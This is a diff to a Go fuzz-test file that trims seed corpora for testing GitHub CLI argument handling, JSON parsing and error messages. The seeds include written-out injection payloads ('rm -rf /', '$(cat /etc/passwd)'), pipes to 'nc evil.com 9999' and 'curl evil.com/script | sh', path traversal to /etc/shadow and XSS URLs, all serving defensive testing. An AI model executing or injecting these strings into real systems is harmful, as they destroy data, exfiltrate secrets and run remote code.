@@ -19,62 +19,46 @@ import (
 var ErrCommandFailed = errors.New("command failed")
 
 func FuzzGitHubCLIArgs(f *testing.F) {
-	// Add seed corpus for different CLI argument scenarios
+	// Add seed corpus - optimized to 20 high-value security test cases
 	seeds := []struct {
 		command string
 		repo    string
 		arg1    string
 		arg2    string
 	}{
-		// Valid commands
+		// Valid commands (3)
 		{"gh", "org/repo", "api", "repos/org/repo/branches"},
 		{"gh", "user/project", "api", "repos/user/project/pulls"},
 		{"gh", "company/app", "api", "repos/company/app/commits/main"},
 
-		// Command injection attempts in repo names
+		// Command injection attempts (5)
 		{"gh", "org/repo; rm -rf /", "api", "repos/org/repo; rm -rf //branches"},
 		{"gh", "org/repo && curl evil.com", "api", "repos/org/repo && curl evil.com/branches"},
 		{"gh", "org/repo`whoami`", "api", "repos/org/repo`whoami`/branches"},
 		{"gh", "org/repo$(cat /etc/passwd)", "api", "repos/org/repo$(cat /etc/passwd)/branches"},
 		{"gh", "org/repo|tee /tmp/pwned", "api", "repos/org/repo|tee /tmp/pwned/branches"},
-		{"gh", "org/repo > /dev/null", "api", "repos/org/repo > /dev/null/branches"},
-		{"gh", "org/repo < /etc/passwd", "api", "repos/org/repo < /etc/passwd/branches"},
 
-		// Path traversal in repo names
+		// Path traversal (3)
 		{"gh", "../../../etc/passwd", "api", "repos/../../../etc/passwd/branches"},
-		{"gh", "../../root/.ssh", "api", "repos/../../root/.ssh/branches"},
 		{"gh", "~/../../etc/shadow", "api", "repos/~/../../etc/shadow/branches"},
 		{"gh", "$HOME/../etc/hosts", "api", "repos/$HOME/../etc/hosts/branches"},
 
-		// Special characters in arguments
-		{"gh", "org/repo", "api", "repos/org/repo/branches; rm -rf /"},
-		{"gh", "org/repo", "api", "repos/org/repo/pulls`whoami`"},
-		{"gh", "org/repo", "api", "repos/org/repo/commits$(id)"},
-		{"gh", "org/repo", "api", "repos/org/repo/contents|nc evil.com 9999"},
-
-		// Unicode and special encoding
-		{"gh", "🎉/🎉", "api", "repos/🎉/🎉/branches"},
+		// Special characters (3)
 		{"gh", "org/repo", "api", "repos/org/repo/branches\x00"},
 		{"gh", "org/repo\n", "api", "repos/org/repo\n/branches"},
-		{"gh", "org/repo\r\n", "api", "repos/org/repo\r\n/branches"},
+		{"gh", "org/repo", "api", "repos/org/repo/branches; rm -rf /"},
 
-		// Extremely long arguments
+		// Long inputs (2)
 		{"gh", strings.Repeat("a", 1000), "api", "repos/" + strings.Repeat("a", 1000) + "/branches"},
 		{"gh", "org/repo", "api", strings.Repeat("repos/org/repo/", 100) + "branches"},
 
-		// Empty and whitespace arguments
-		{"gh", "", "api", "repos//branches"},
-		{"gh", " ", "api", "repos/ /branches"},
-		{"gh", "\t", "api", "repos/\t/branches"},
-		{"gh", "org/repo", "", "repos/org/repo/branches"},
-		{"gh", "org/repo", " ", "repos/org/repo/branches"},
-
-		// Flag-like arguments that could be misinterpreted
+		// Flag-like arguments (2)
 		{"gh", "-rf", "api", "repos/-rf/branches"},
 		{"gh", "--help", "api", "repos/--help/branches"},
-		{"gh", "-", "api", "repos/-/branches"},
-		{"gh", "org/repo", "--force", "repos/org/repo/branches"},
-		{"gh", "org/repo", "-f", "state=open"},
+
+		// Empty/whitespace (2)
+		{"gh", "", "api", "repos//branches"},
+		{"gh", " ", "api", "repos/ /branches"},
 	}
 
 	for _, seed := range seeds {
@@ -152,83 +136,67 @@ func FuzzGitHubCLIArgs(f *testing.F) {
 }
 
 func FuzzJSONParsing(f *testing.F) {
-	// Add seed corpus for different JSON scenarios
+	// Add seed corpus - optimized to 40 high-value security test cases
 	seeds := []string{
-		// Valid GitHub API responses
+		// Valid GitHub API responses (3)
 		`{"name": "master", "protected": false, "commit": {"sha": "abc123", "url": "https://api.github.com/repos/org/repo/commits/abc123"}}`,
 		`[{"name": "master"}, {"name": "develop"}]`,
 		`{"number": 1, "state": "open", "title": "Test PR", "body": "Description", "head": {"ref": "feature", "sha": "def456"}, "base": {"ref": "master", "sha": "abc123"}}`,
-		`{"sha": "abc123", "commit": {"message": "Initial commit", "author": {"name": "John Doe", "email": "john@example.com"}}}`,
-		`{"path": "README.md", "content": "SGVsbG8gV29ybGQ=", "encoding": "base64", "sha": "abc123"}`,
 
-		// Malformed JSON
+		// Malformed JSON (5)
 		`{`,
-		`}`,
-		`{{{`,
 		`}}}`,
 		`{"name": }`,
 		`{"name": "value"`,
-		`{"name": "value",}`,
 		`[{"name": "master"`,
-		`]`,
 
-		// Command injection attempts in JSON values
+		// Command injection in JSON values (6)
 		`{"name": "main; rm -rf /", "protected": false}`,
 		`{"title": "PR` + "`whoami`" + `", "body": "test"}`,
 		`{"message": "commit$(cat /etc/passwd)", "author": {"name": "test"}}`,
 		`{"path": "file|nc evil.com 9999", "content": "test"}`,
 		`{"name": "branch && curl evil.com/script | sh", "protected": true}`,
 		`{"body": "text > /tmp/pwned", "title": "test"}`,
-		`{"name": "branch < /etc/passwd", "protected": false}`,
 
-		// Path traversal in JSON values
+		// Path traversal (4)
 		`{"path": "../../../etc/passwd", "content": "test"}`,
 		`{"name": "../../etc/shadow", "protected": false}`,
 		`{"title": "PR for ~/../../root/.ssh", "body": "test"}`,
 		`{"message": "Update $HOME/../etc/hosts", "author": {"name": "test"}}`,
 
-		// Null bytes and special characters
+		// Special characters (5)
 		`{"name": "main\x00", "protected": false}`,
 		`{"title": "PR\n\rtest", "body": "desc"}`,
 		`{"message": "commit\ttab", "author": {"name": "test"}}`,
 		`{"path": "file\"quote", "content": "test"}`,
 		`{"name": "branch'single", "protected": false}`,
-		`{"body": "text\\backslash", "title": "test"}`,
 
-		// Unicode and internationalization
+		// Unicode (3)
 		`{"name": "🎉-feature", "protected": false}`,
 		`{"title": "PR with émojis 🚀", "body": "test"}`,
-		`{"message": "Commit résumé français", "author": {"name": "Jean"}}`,
 		`{"path": "файл.txt", "content": "test"}`,
 
-		// Very large JSON
+		// Large/nested JSON (3)
 		`{"name": "` + strings.Repeat("a", 10000) + `", "protected": false}`,
-		`{"title": "` + strings.Repeat("PR", 5000) + `", "body": "test"}`,
 		`[` + strings.Repeat(`{"name": "branch"},`, 1000) + `{"name": "last"}]`,
-
-		// Deeply nested JSON
 		`{"a": {"b": {"c": {"d": {"e": {"f": {"g": {"h": {"i": {"j": "deep"}}}}}}}}}}`,
-		strings.Repeat(`{"level":`, 100) + `"deep"` + strings.Repeat(`}`, 100),
 
-		// JSON with unusual data types
+		// Unusual types (3)
 		`{"number": "string_instead_of_int", "protected": "not_boolean"}`,
 		`{"created_at": "not_a_date", "merged_at": 12345}`,
 		`{"labels": "should_be_array", "parents": {"should": "be_array"}}`,
 
-		// Empty and minimal JSON
+		// Empty/minimal (3)
 		`{}`,
 		`[]`,
 		`null`,
-		`""`,
-		`0`,
-		`true`,
-		`false`,
 
-		// JSON with suspicious URLs
+		// Suspicious URLs (5)
 		`{"url": "file:///etc/passwd", "name": "test"}`,
 		`{"url": "javascript:alert(1)", "name": "test"}`,
 		`{"url": "data:text/html,<script>alert(1)</script>", "name": "test"}`,
 		`{"url": "http://evil.com/malware.exe", "name": "test"}`,
+		`{"path": "README.md", "content": "SGVsbG8gV29ybGQ=", "encoding": "base64", "sha": "abc123"}`,
 	}
 
 	for _, seed := range seeds {
@@ -501,60 +469,46 @@ func validateGenericJSON(t *testing.T, data interface{}) {
 
 // Test error handling patterns
 func FuzzErrorHandling(f *testing.F) {
-	// Add seed corpus for different error scenarios
+	// Add seed corpus - optimized to 25 high-value security test cases
 	seeds := []string{
-		// Standard GitHub API errors
+		// Standard GitHub API errors (5)
 		"404 Not Found",
 		"403 Forbidden",
 		"401 Unauthorized",
-		"422 Unprocessable Entity",
 		"500 Internal Server Error",
-		"502 Bad Gateway",
 		"503 Service Unavailable",
 
-		// gh CLI error patterns
+		// gh CLI error patterns (5)
 		"gh: could not resolve repository",
 		"gh: Not Found (HTTP 404)",
 		"gh: Forbidden (HTTP 403)",
 		"Error: repository not found",
 		"Error: branch not found",
-		"Error: pull request not found",
-		"Error: file not found",
-		"Error: commit not found",
 
-		// Command injection in error messages
+		// Command injection (4)
 		"Error: repository not found; rm -rf /",
 		"404 Not Found`whoami`",
 		"Error: branch $(cat /etc/passwd) not found",
 		"gh: could not resolve|nc evil.com 9999",
-		"Error: > /tmp/pwned",
-		"404 < /etc/passwd",
 
-		// Path traversal in error messages
+		// Path traversal (3)
 		"Error: ../../../etc/passwd not found",
 		"404: ../../root/.ssh",
-		"Error: ~/../../etc/shadow not accessible",
 		"gh: could not resolve $HOME/../etc/hosts",
 
-		// Special characters in error messages
+		// Special characters (3)
 		"Error: repo\x00 not found",
 		"404\n\rNot Found",
-		"Error: branch\ttab not found",
 		"gh: \"quote\" error",
-		"Error: 'single' quote issue",
-		"404: \\backslash problem",
 
-		// Very long error messages
+		// Long messages (2)
 		"Error: " + strings.Repeat("a", 10000) + " not found",
 		"404: " + strings.Repeat("Not Found ", 1000),
 
-		// Empty and minimal errors
+		// Empty/minimal (3)
 		"",
-		" ",
 		"Error:",
 		"404",
-		"\n",
-		"\t",
 	}
 
 	for _, seed := range seeds {
